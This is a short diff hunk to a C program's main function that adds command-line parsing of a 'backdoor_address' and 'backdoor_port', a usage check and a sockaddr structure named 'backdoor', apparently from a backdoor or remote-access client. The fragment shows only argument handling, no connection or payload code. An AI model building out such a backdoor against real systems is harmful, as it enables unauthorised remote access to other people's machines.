@@ -5,6 +5,15 @@
 
 int main(int argc, char *argv[]){
 
+    char *file_name = argv[0];
+    char *backdoor_address = argv[1];
+    char *backdoor_port = argv[2];
+    
+    if(argc != 3){
+        show_help(file_name);
+        exit(1);
+    }
+
     show_banner();
 
     struct sockaddr_in backdoor;
